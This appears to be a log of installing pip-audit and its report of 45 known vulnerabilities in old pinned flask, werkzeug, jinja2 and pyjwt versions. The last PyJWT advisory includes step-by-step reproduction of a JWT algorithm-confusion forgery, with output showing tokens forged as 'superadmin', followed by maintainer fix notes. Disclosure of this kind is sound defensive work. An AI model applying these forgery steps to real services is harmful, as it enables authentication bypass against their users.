+  Downloading msgpack-1.2.4-cp312-cp312-manylinux2014_x86_64.manylinux_2_17_x86_64.manylinux_2_28_x86_64.whl.metadata (8.3 kB)
+Collecting filelock>=3.8.0 (from CacheControl[filecache]>=0.13.0->pip-audit==2.9.0)
+  Downloading filelock-4.2.12-py3-none-any.whl.metadata (2.3 kB)
+Collecting license-expression<31,>=30 (from cyclonedx-python-lib<10,>=5->pip-audit==2.9.0)
+  Downloading license_expression-30.4.4-py3-none-any.whl.metadata (11 kB)
+Collecting packageurl-python<2,>=0.11 (from cyclonedx-python-lib<10,>=5->pip-audit==2.9.0)
+  Downloading packageurl_python-0.17.6-py3-none-any.whl.metadata (5.1 kB)
+Collecting py-serializable<3.0.0,>=2.0.0 (from cyclonedx-python-lib<10,>=5->pip-audit==2.9.0)
+  Downloading py_serializable-2.2.0-py3-none-any.whl.metadata (4.5 kB)
+Collecting sortedcontainers<3.0.0,>=2.4.0 (from cyclonedx-python-lib<10,>=5->pip-audit==2.9.0)
+  Downloading sortedcontainers-2.4.0-py2.py3-none-any.whl.metadata (10 kB)
+Requirement already satisfied: pip in /usr/local/lib/python3.12/site-packages (from pip-api>=0.0.28->pip-audit==2.9.0) (25.0.1)
+Collecting pyparsing (from pip-requirements-parser>=32.0.0->pip-audit==2.9.0)
+  Downloading pyparsing-3.3.3-py3-none-any.whl.metadata (5.9 kB)
+Collecting charset_normalizer<4,>=2 (from requests>=2.31.0->pip-audit==2.9.0)
+  Downloading charset_normalizer-3.5.2-cp312-cp312-manylinux2014_x86_64.manylinux_2_17_x86_64.manylinux_2_28_x86_64.whl.metadata (46 kB)
+Collecting idna<4,>=2.5 (from requests>=2.31.0->pip-audit==2.9.0)
+  Downloading idna-3.20-py3-none-any.whl.metadata (7.2 kB)
+Collecting urllib3<3,>=1.26 (from requests>=2.31.0->pip-audit==2.9.0)
+  Downloading urllib3-2.8.0-py3-none-any.whl.metadata (7.4 kB)
+Collecting certifi>=2023.5.7 (from requests>=2.31.0->pip-audit==2.9.0)
+  Downloading certifi-2026.10.23-py3-none-any.whl.metadata (2.5 kB)
+Collecting markdown-it-py>=2.2.0 (from rich>=12.4->pip-audit==2.9.0)
+  Downloading markdown_it_py-4.3.0-py3-none-any.whl.metadata (7.9 kB)
+Collecting pygments<3.0.0,>=2.13.0 (from rich>=12.4->pip-audit==2.9.0)
+  Downloading pygments-2.21.0-py3-none-any.whl.metadata (2.5 kB)
+Collecting boolean.py>=4.0 (from license-expression<31,>=30->cyclonedx-python-lib<10,>=5->pip-audit==2.9.0)
+  Downloading boolean_py-5.0-py3-none-any.whl.metadata (2.3 kB)
+Collecting mdurl~=0.1 (from markdown-it-py>=2.2.0->rich>=12.4->pip-audit==2.9.0)
+  Downloading mdurl-0.1.2-py3-none-any.whl.metadata (1.6 kB)
+Collecting defusedxml<0.8.0,>=0.7.1 (from py-serializable<3.0.0,>=2.0.0->cyclonedx-python-lib<10,>=5->pip-audit==2.9.0)
+  Downloading defusedxml-0.7.1-py2.py3-none-any.whl.metadata (32 kB)
+Downloading pip_audit-2.9.0-py3-none-any.whl (58 kB)
+Downloading cachecontrol-0.15.0-py3-none-any.whl (22 kB)
+Downloading cyclonedx_python_lib-9.1.0-py3-none-any.whl (374 kB)
+Downloading packaging-26.3-py3-none-any.whl (129 kB)
+Downloading pip_api-0.0.35-py3-none-any.whl (123 kB)
+Downloading pip_requirements_parser-32.0.1-py3-none-any.whl (35 kB)
+Downloading platformdirs-4.14.7-py3-none-any.whl (89 kB)
+Downloading requests-2.34.2-py3-none-any.whl (73 kB)
+Downloading rich-15.0.0-py3-none-any.whl (310 kB)
+Downloading toml-0.10.2-py2.py3-none-any.whl (16 kB)
+Downloading certifi-2026.10.23-py3-none-any.whl (135 kB)
+Downloading charset_normalizer-3.5.2-cp312-cp312-manylinux2014_x86_64.manylinux_2_17_x86_64.manylinux_2_28_x86_64.whl (257 kB)
+Downloading filelock-4.2.12-py3-none-any.whl (222 kB)
+Downloading idna-3.20-py3-none-any.whl (69 kB)
+Downloading license_expression-30.4.4-py3-none-any.whl (120 kB)
+Downloading markdown_it_py-4.3.0-py3-none-any.whl (96 kB)
+Downloading msgpack-1.2.4-cp312-cp312-manylinux2014_x86_64.manylinux_2_17_x86_64.manylinux_2_28_x86_64.whl (475 kB)
+Downloading packageurl_python-0.17.6-py3-none-any.whl (36 kB)
+Downloading py_serializable-2.2.0-py3-none-any.whl (23 kB)
+Downloading pygments-2.21.0-py3-none-any.whl (1.3 MB)
+   ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━ 1.3/1.3 MB 8.8 MB/s eta 0:00:00
+Downloading sortedcontainers-2.4.0-py2.py3-none-any.whl (29 kB)
+Downloading urllib3-2.8.0-py3-none-any.whl (135 kB)
+Downloading pyparsing-3.3.3-py3-none-any.whl (126 kB)
+Downloading boolean_py-5.0-py3-none-any.whl (26 kB)
+Downloading defusedxml-0.7.1-py2.py3-none-any.whl (25 kB)
+Downloading mdurl-0.1.2-py3-none-any.whl (10.0 kB)
+Installing collected packages: sortedcontainers, boolean.py, urllib3, toml, pyparsing, pygments, platformdirs, pip-api, packaging, packageurl-python, msgpack, mdurl, license-expression, idna, filelock, defusedxml, charset_normalizer, certifi, requests, py-serializable, pip-requirements-parser, markdown-it-py, rich, cyclonedx-python-lib, CacheControl, pip-audit
+Successfully installed CacheControl-0.15.0 boolean.py-5.0 certifi-2026.10.23 charset_normalizer-3.5.2 cyclonedx-python-lib-9.1.0 defusedxml-0.7.1 filelock-4.2.12 idna-3.20 license-expression-30.4.4 markdown-it-py-4.3.0 mdurl-0.1.2 msgpack-1.2.4 packageurl-python-0.17.6 packaging-26.3 pip-api-0.0.35 pip-audit-2.9.0 pip-requirements-parser-32.0.1 platformdirs-4.14.7 py-serializable-2.2.0 pygments-2.21.0 pyparsing-3.3.3 requests-2.34.2 rich-15.0.0 sortedcontainers-2.4.0 toml-0.10.2 urllib3-2.8.0
+WARNING: Running pip as the 'root' user can result in broken permissions and conflicting behaviour with the system package manager, possibly rendering your system unusable. It is recommended to use a virtual environment instead: https://pip.pypa.io/warnings/venv. Use the --root-user-action option if you know what you are doing and want to suppress this warning.
+
+[notice] A new release of pip is available: 25.0.1 -> 26.3
+[notice] To update, run: pip install --upgrade pip
+WARNING:pip_audit._cli:--no-deps is supported, but users are encouraged to fully hash their pinned dependencies
+WARNING:pip_audit._cli:Consider using a tool like `pip-compile`: https://pip-tools.readthedocs.io/en/latest/#using-hashes
+Found 45 known vulnerabilities in 7 packages
+WARNING:pip_audit._cli:--no-deps is supported, but users are encouraged to fully hash their pinned dependencies
+WARNING:pip_audit._cli:Consider using a tool like `pip-compile`: https://pip-tools.readthedocs.io/en/latest/#using-hashes
+Found 45 known vulnerabilities in 7 packages
+Name     Version ID                  Fix Versions  Description
+-------- ------- ------------------- ------------- ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
+flask    2.2.2   PYSEC-2023-62       2.2.5,2.3.2   Flask is a lightweight WSGI web application framework. When all of the following conditions are met, a response containing data intended for one client may be cached and subsequently sent by the proxy to other clients. If the proxy also caches `Set-Cookie` headers, it may send one client's `session` cookie to other clients. The severity depends on the application's use of the session and the proxy's behavior regarding cookies. The risk depends on all these conditions being met.  1. The application must be hosted behind a caching proxy that does not strip cookies or ignore responses with cookies. 2. The application sets `session.permanent = True` 3. The application does not access or modify the session at any point during a request. 4. `SESSION_REFRESH_EACH_REQUEST` enabled (the default). 5. The application does not set a `Cache-Control` header to indicate that a page is private or should not be cached.  This happens because vulnerable versions of Flask only set the `Vary: Cookie` header when the session is accessed or modified, not when it is refreshed (re-sent to update the expiration) without being accessed or modified. This issue has been fixed in versions 2.3.2 and 2.2.5.
+flask    2.2.2   PYSEC-2026-2151     3.1.3         Flask is a web server gateway interface (WSGI) web application framework. In versions 3.1.2 and below, when the session object is accessed, Flask should set the Vary: Cookie header., resulting in a Use of Cache Containing Sensitive Information vulnerability. The logic instructs caches not to cache the response, as it may contain information specific to a logged in user. This is handled in most cases, but some forms of access such as the Python in operator were overlooked. The severity and risk depend on the application being hosted behind a caching proxy that doesn't ignore responses with cookies, not setting a Cache-Control header to mark pages as private or non-cacheable, and accessing the session in a way that only touches keys without reading values or mutating the session. The issue has been fixed in version 3.1.3.
+werkzeug 2.2.2   PYSEC-2023-58       2.2.3         Werkzeug is a comprehensive WSGI web application library. Prior to version 2.2.3, Werkzeug's multipart form data parser will parse an unlimited number of parts, including file parts. Parts can be a small amount of bytes, but each requires CPU time to parse and may use more memory as Python data. If a request can be made to an endpoint that accesses `request.data`, `request.form`, `request.files`, or `request.get_data(parse_form_data=False)`, it can cause unexpectedly high resource usage. This allows an attacker to cause a denial of service by sending crafted multipart data to an endpoint that will parse it. The amount of CPU time required can block worker processes from handling legitimate requests. The amount of RAM required can trigger an out of memory kill of the process. Unlimited file parts can use up memory and file handles. If many concurrent requests are sent continuously, this can exhaust or kill all available workers. Version 2.2.3 contains a patch for this issue.
+werkzeug 2.2.2   PYSEC-2023-57       2.2.3         Werkzeug is a comprehensive WSGI web application library. Browsers may allow "nameless" cookies that look like `=value` instead of `key=value`. A vulnerable browser may allow a compromised application on an adjacent subdomain to exploit this to set a cookie like `=__Host-test=bad` for another subdomain. Werkzeug prior to 2.2.3 will parse the cookie `=__Host-test=bad` as __Host-test=bad`. If a Werkzeug application is running next to a vulnerable or malicious subdomain which sets such a cookie using a vulnerable browser, the Werkzeug application will see the bad cookie value but the valid cookie key. The issue is fixed in Werkzeug 2.2.3.
+werkzeug 2.2.2   PYSEC-2023-221      2.3.8,3.0.1   Werkzeug is a comprehensive WSGI web application library. If an upload of a file that starts with CR or LF and then is followed by megabytes of data without these characters: all of these bytes are appended chunk by chunk into internal bytearray and lookup for boundary is performed on growing buffer. This allows an attacker to cause a denial of service by sending crafted multipart data to an endpoint that will parse it. The amount of CPU time required can block worker processes from handling legitimate requests. This vulnerability has been patched in version 3.0.1.
+werkzeug 2.2.2   PYSEC-2026-2046     3.1.4         Werkzeug's `safe_join` function allows path segments with Windows device names. On Windows, there are special device names such as `CON`, `AUX`, etc that are implicitly present and readable in every directory. `send_from_directory` uses `safe_join` to safely serve files at user-specified paths under a directory. If the application is running on Windows, and the requested path ends with a special device name, the file will be opened successfully, but reading will hang indefinitely.
+werkzeug 2.2.2   PYSEC-2026-2045     3.0.6         On Python < 3.11 on Windows, `os.path.isabs()` does not catch UNC paths like `//server/share`. Werkzeug's `safe_join()` relies on this check, and so can produce a path that is not safe, potentially allowing unintended access to data. Applications using Python >= 3.11, or not using Windows, are not vulnerable.
+werkzeug 2.2.2   PYSEC-2026-2044     3.1.5         Werkzeug's `safe_join` function allows path segments with Windows device names that have file extensions or trailing spaces. On Windows, there are special device names such as `CON`, `AUX`, etc that are implicitly present and readable in every directory. Windows still accepts them with any file extension, such as `CON.txt`, or trailing spaces such as `CON `.  This was previously reported as https://github.com/pallets/werkzeug/security/advisories/GHSA-hgf8-39gv-g3f2, but the fix failed to account for compound extensions such as `CON.txt.html` or trailing spaces. It also missed some additional special names.  `send_from_directory` uses `safe_join` to safely serve files at user-specified paths under a directory. If the application is running on Windows, and the requested path ends with a special device name, the file will be opened successfully, but reading will hang indefinitely.
+werkzeug 2.2.2   PYSEC-2026-2043     3.0.3         The debugger in affected versions of Werkzeug can allow an attacker to execute code on a developer's machine under some circumstances. This requires the attacker to get the developer to interact with a domain and subdomain they control, and enter the debugger PIN, but if they are successful it allows access to the debugger even if it is only running on localhost. This also requires the attacker to guess a URL in the developer's application that will trigger the debugger.
+werkzeug 2.2.2   PYSEC-2026-2320     3.1.6         Werkzeug is a comprehensive WSGI web application library. Versions 3.1.5 and below, the safe_join function allows Windows device names as filenames if preceded by other path segments. This was previously reported as GHSA-hgf8-39gv-g3f2, but the added filtering failed to account for the fact that safe_join accepts paths with multiple segments, such as example/NUL. The function send_from_directory uses safe_join to safely serve files at user-specified paths under a directory. If the application is running on Windows, and the requested path ends with a special device name, the file will be opened successfully, but reading will hang indefinitely. This issue has been fixed in version 3.1.6.
+werkzeug 2.2.2   PYSEC-2026-3417     3.0.6         Applications using Werkzeug to parse `multipart/form-data` requests are vulnerable to resource exhaustion. A specially crafted form body can bypass the `Request.max_form_memory_size` setting.   The `Request.max_content_length` setting, as well as resource limits provided by deployment software and platforms, are also available to limit the resources used during a request. This vulnerability does not affect those settings. All three types of limits should be considered and set appropriately when deploying an application.
+werkzeug 2.2.2   PYSEC-2026-4312     3.1.9         Werkzeug's `safe_join` function allows Windows device names as filenames when they have an empty ADS marker on NTFS.  This was previously reported as https://github.com/pallets/werkzeug/security/advisories/GHSA-hgf8-39gv-g3f2, but the added filtering failed to account for the fact Windows allows special device names with an empty ADS marker, such as `NUL:`.  `send_from_directory` uses `safe_join` to safely serve files at user-specified paths under a directory. If the application is running on Windows and NTFS, and the requested path ends with a special device name, the file will be opened successfully, but reading will hang indefinitely.
+jinja2   3.1.2   PYSEC-2026-1473     3.1.3         The `xmlattr` filter in affected versions of Jinja accepts keys containing spaces. XML/HTML attributes cannot contain spaces, as each would then be interpreted as a separate attribute. If an application accepts keys (as opposed to only values) as user input, and renders these in pages that other users see as well, an attacker could use this to inject other attributes and perform XSS. Note that accepting keys as user input is not common or a particularly intended use case of the `xmlattr` filter, and an application doing so should already be verifying what keys are provided regardless of this fix.
+jinja2   3.1.2   PYSEC-2026-1471     3.1.6         An oversight in how the Jinja sandboxed environment interacts with the `|attr` filter allows an attacker that controls the content of a template to execute arbitrary Python code.  To exploit the vulnerability, an attacker needs to control the content of a template. Whether that is the case depends on the type of application using Jinja. This vulnerability impacts users of applications which execute untrusted templates.  Jinja's sandbox does catch calls to `str.format` and ensures they don't escape the sandbox. However, it's possible to use the `|attr` filter to get a reference to a string's plain format method, bypassing the sandbox. After the fix, the `|attr` filter no longer bypasses the environment's attribute lookup.
+jinja2   3.1.2   PYSEC-2026-1474     3.1.4         The `xmlattr` filter in affected versions of Jinja accepts keys containing non-attribute characters. XML/HTML attributes cannot contain spaces, `/`, `>`, or `=`, as each would then be interpreted as starting a separate attribute. If an application accepts keys (as opposed to only values) as user input, and renders these in pages that other users see as well, an attacker could use this to inject other attributes and perform XSS. The fix for the previous GHSA-h5c8-rqwp-cp95 CVE-2024-22195 only addressed spaces but not other characters.  Accepting keys as user input is now explicitly considered an unintended use case of the `xmlattr` filter, and code that does so without otherwise validating the input should be flagged as insecure, regardless of Jinja version. Accepting _values_ as user input continues to be safe.
+jinja2   3.1.2   PYSEC-2026-1475     3.1.5         An oversight in how the Jinja sandboxed environment detects calls to `str.format` allows an attacker that controls the content of a template to execute arbitrary Python code.  To exploit the vulnerability, an attacker needs to control the content of a template. Whether that is the case depends on the type of application using Jinja. This vulnerability impacts users of applications which execute untrusted templates.  Jinja's sandbox does catch calls to `str.format` and ensures they don't escape the sandbox. However, it's possible to store a reference to a malicious string's `format` method, then pass that to a filter that calls it. No such filters are built-in to Jinja, but could be present through custom filters in an application. After the fix, such indirect calls are also handled by the sandbox.
+jinja2   3.1.2   PYSEC-2026-1472     3.1.5         A bug in the Jinja compiler allows an attacker that controls both the content and filename of a template to execute arbitrary Python code, regardless of if Jinja's sandbox is used.  To exploit the vulnerability, an attacker needs to control both the filename and the contents of a template. Whether that is the case depends on the type of application using Jinja. This vulnerability impacts users of applications which execute untrusted templates where the template author can also choose the template filename.
+pyjwt    1.7.1   PYSEC-2022-202      2.4.0         PyJWT is a Python implementation of RFC 7519. PyJWT supports multiple different JWT signing algorithms. With JWT, an attacker submitting the JWT token can choose the used signing algorithm. The PyJWT library requires that the application chooses what algorithms are supported. The application can specify `jwt.algorithms.get_default_algorithms()` to get support for all algorithms, or specify a single algorithm. The issue is not that big as `algorithms=jwt.algorithms.get_default_algorithms()` has to be used. Users should upgrade to v2.4.0 to receive a patch for this issue. As a workaround, always be explicit with the algorithms that are accepted and expected when decoding.
+pyjwt    1.7.1   PYSEC-2026-120      2.12.0        PyJWT is a JSON Web Token implementation in Python. Prior to 2.12.0, PyJWT does not validate the crit (Critical) Header Parameter defined in RFC 7515 §4.1.11. When a JWS token contains a crit array listing extensions that PyJWT does not understand, the library accepts the token instead of rejecting it. This violates the MUST requirement in the RFC. This vulnerability is fixed in 2.12.0.
+pyjwt    1.7.1   PYSEC-2025-183                    pyjwt v2.10.1 was discovered to contain weak encryption. NOTE: this is disputed by the Supplier because the key length is chosen by the application that uses the library (admittedly, library users may benefit from a minimum value and a mechanism for opting in to strict enforcement).
+pyjwt    1.7.1   PYSEC-2026-179      2.13.0        PyJWT is a JSON Web Token implementation in Python. Prior to 2.13.0, when the verifier is decoding JSON Web Tokens, while supporting both asymmetric and HMAC algorithms, the library does not validate use of JSON Web Keys in HMAC algorithm, allowing attacker to use the issuer public key as the secret key for HMAC algorithm. This vulnerability is fixed in 2.13.0.
+pyjwt    1.7.1   PYSEC-2026-175      2.13.0        PyJWT is a JSON Web Token implementation in Python. Prior to 2.13.0, PyJWKClient passes its uri argument directly to urllib.request.urlopen() which uses Python stdlib's default OpenerDirector registering HTTPHandler, HTTPSHandler, FTPHandler, FileHandler, and DataHandler. There is currently no documented option to restrict which schemes PyJWKClient will fetch. If an application's jku URL ingestion path accepts attacker-influenced URLs (e.g., from JWT header, configuration file, OAuth flow parameter), the attacker can cause PyJWKClient to read arbitrary local files via file:// (SSRF on local filesystem), cause PyJWKClient to attempt FTP / data-URI fetches (broader SSRF surface), or forge tokens that PyJWT verifies as valid. The library does not directly return non-HTTP(S) URI contents to the attacker; the chained "plant a JWKS to forge tokens" scenario described in the original report requires additional application-layer flaws (attacker write access to a filesystem path, untrusted jku derivation) that this fix does not address. This vulnerability is fixed in 2.13.0.
+pyjwt    1.7.1   PYSEC-2026-177      2.13.0        PyJWT is a JSON Web Token implementation in Python. Prior to 2.13.0, PyJWKClient.get_signing_key() forces a fresh HTTP request to the JWKS endpoint for every JWT with an unknown kid value, with no rate limiting. Since kid comes from the unverified token header, an attacker can trigger unlimited outbound requests. The vulnerability surfaces only when a JWKS fetch fails; an attacker can attempt to provoke that with sustained unknown-kid traffic, but the outcome depends on upstream JWKS-endpoint behavior (rate limiting, transient errors) which is beyond the attacker's control. This vulnerability is fixed in 2.13.0.
+pyjwt    1.7.1   PYSEC-2026-4145     2.14.0        **Prerequisites** (both conditions must hold; both are deployment properties, not attacker-controlled at request time):  - The `jwt.decode` allow-list mixes an HMAC algorithm with an asymmetric one, e.g. `algorithms=["ES256", "HS256"]` (the RFC 8725 footgun the guard exists to backstop). - The verification key is passed as raw PEM text/bytes on the non-`PyJWK` path, in a byte-form that `cryptography`'s loader accepts but PyJWT's `is_pem_format` regex does not recognize (marker-adjacent whitespace/indentation, CR-only line terminators, or the PEM folded to a single line). Such forms arise naturally from an indented YAML/JSON block, a single-line environment variable or JSON string, or a CR/LF round-trip through config tooling.  The attacker additionally needs the public verification key, which is public by definition, and `cryptography` must be installed.  The fix for CVE-2022-29217 rejects an asymmetric key handed to an HMAC algorithm, but only when `is_pem_format()` recognizes the key as PEM. That recognizer accepts strictly fewer byte-forms than the loader that later parses the key, so a PEM the guard misses still loads as a valid public key and is then used as an HMAC secret. This is an incomplete-guard bypass of the CVE-2022-29217 family.  ### Summary A PEM public key with marker-adjacent whitespace, CR-only line terminators, or folded to a single line makes PyJWT's `is_pem_format()` return `False` while `cryptography.load_pem_public_key()` accepts the identical bytes. The asymmetric-key rejection in `HMACAlgorithm.prepare_key` is skipped, the public key becomes the HMAC secret, and an attacker who knows the public key mints a valid `HS256` token — universal forgery — whenever the verify allow-list mixes an HMAC and an asymmetric algorithm.  ### Details At `jwt/algorithms.py:331-335`, `HMACAlgorithm.prepare_key` contains the sole family-mismatch guard:      if is_pem_format(key_bytes) or is_ssh_key(key_bytes):         raise InvalidKeyError(             "The specified key is an asymmetric key or x509 certificate and"             " should not be used as an HMAC secret."         )  If neither predicate fires, `:357` returns `key_bytes` unchanged — the PEM text is used directly as the HMAC secret.  `is_pem_format` (`jwt/utils.py:116-127`) is `bool(_PEM_RE.search(key))`, where `_PEM_RE` requires `----[- ]BEGIN (...)[- ]----\r?\n`, then `.+?\r?\n`, then the END marker. The LF in each `\r?\n` is mandatory, the markers are anchored directly after a newline, and only `[- ]` is tolerated adjacent to them — not arbitrary whitespace. So a key with a tab/space before the END marker, with bare `\r` terminators, or folded onto one line is not recognized as PEM. `cryptography`'s `load_pem_public_key` is tolerant of exactly these forms and still returns the key.  Reach: `jwt/api_jws.py:386` performs the allow-list check (passes when `HS256` is in the list) and takes the non-`PyJWK` branch to `alg_obj.prepare_key(key)` at `:407`. The mismatch guard above is the only thing standing between a mixed allow-list and using the public key as an HMAC secret.  ### PoC Vulnerable path: `jwt/algorithms.py:331` (guard gated on `is_pem_format`) -> `is_pem_format` returns `False` for a loader-accepted PEM -> `jwt/algorithms.py:357` returns the public-key bytes as the HMAC secret -> `HS256` verification succeeds.  Reproduced on PyJWT 2.13.0 (commit `7144e453`) with `cryptography` 49.0.0, using only the public API. For each of an EC (ES256) and an RSA-2048 (RS256) key: start from the correct public-key PEM, apply a mutation, confirm `is_pem_format` now returns `False` while `cryptography` still loads the bytes, then verify a token signed `alg=HS256` with the public-key text as the HMAC secret, under `algorithms=["ES256","HS256"]` (resp. `["RS256","HS256"]`).  Observed output:      pyjwt 2.13.0       ec  canonical (control)                is_pem_format=True  crypto_loads=True  forgery=BLOCKED:InvalidKeyError       ec  marker-adjacent (tab before END)   is_pem_format=False crypto_loads=True  forgery=FORGED(superadmin)       ec  CR-only terminators                is_pem_format=False crypto_loads=True  forgery=FORGED(superadmin)       ec  folded single-line                 is_pem_format=False crypto_loads=True  forgery=FORGED(superadmin)       rsa canonical (control)                is_pem_format=True  crypto_loads=True  forgery=BLOCKED:InvalidKeyError       rsa marker-adjacent (tab before END)   is_pem_format=False crypto_loads=True  forgery=FORGED(superadmin)       rsa CR-only terminators                is_pem_format=False crypto_loads=True  forgery=FORGED(superadmin)       rsa folded single-line                 is_pem_format=False crypto_loads=True  forgery=FORGED(superadmin)       [control B] single-alg [ES256] allow-list vs forged HS256: REJECTED:InvalidAlgorithmError     RESULT: ALL-INVARIANTS-HOLD  Each mutated form on both key types forged a token accepted as `superadmin`. Controls: the unmodified PEM is correctly rejected with `InvalidKeyError` (the guard works and the mutation is load-bearing); a single-algorithm allow-list `["ES256"]` rejects the forged `HS256` token with `InvalidAlgorithmError` (the mixed allow-list is a necessary precondition).  Steps to reproduce: 1. Generate an EC P-256 (or RSA-2048) keypair; serialize the public key to PEM. 2. Mutate the PEM into a loader-accepted, regex-missed form — e.g. insert a tab before `-----END`, convert terminators to bare `\r`, or join all lines into one. 3. Confirm `jwt.utils.is_pem_format(mutated) is False` and `cryptography.hazmat.primitives.serialization.load_pem_public_key(mutated)` succeeds. 4. `jwt.encode({"sub":"superadmin"}, mutated, algorithm="HS256")`, then `jwt.decode(token, mutated, algorithms=["ES256","HS256"])` — verification succeeds.  ### Impact Cryptographic signature-verification bypass (CWE-347): algorithm confusion re-enabled by an incomplete asymmetric-key guard. An attacker who knows only the public verification key forges arbitrary-claim tokens that verify as authentic, subject to the two deployment preconditions above. The `PyJWK` verification path binds a single algorithm and is unaffected; `enforce_minimum_key_length` (off by default) does not block a 2048-bit/P-256 PEM. Impact when the preconditions hold is critical (universal forgery); the compound precondition is realistic but was not observed in a specific real-world deployment, so this is rated Critical, with the deployment precondition captured in CVSS.  ## Maintainer update — 2026-09-10  We reproduced the reported asymmetric-key guard bypass on PyJWT 2.13.0: PEM public keys with loader-accepted formatting mutations were missed by `is_pem_format`, then accepted as HMAC secrets when a verification call mixed symmetric and asymmetric algorithms. Canonical PEM controls remained blocked, and a single-algorithm allow-list rejected the forged HS256 token.  The fix is committed as `8b4e233a22206b34ec1186e912e75c0b2396ac07`. PyJWT now scans supported PEM BEGIN/END markers in one pass, preserving matching labels and handling overlapping markers without regex backtracking. Regression coverage includes RSA loader-accepted mutations, incomplete repeated markers, later valid PEM blocks, and overlapping END/BEGIN markers. The fix does not broaden DER-key classification or change the caller's algorithm allow-list policy.  Verification on the signed commit passes with 400 tests and 4 intentional cryptography-environment skips; Ruff formatting/lint and the Python 3.9 mypy tox target pass. Fresh Astra/max independent review accepted the final snapshot and confirmed O(n) scanning, bounded storage, and no blocking compatibility or security finding. The fix has not been released; the advisory remains Critical with CVSS 3.1 score 9.1 and CWE-347.  ## Maintainer update — 2026-09-11  The verified fix for this advisory is included in PyJWT 2.14.0, released on 2026-09-11 and available on PyPI. PyJWT 2.14.0 is the first release containing the fix. This advisory is now published with 2.14.0 recorded as the patched version.
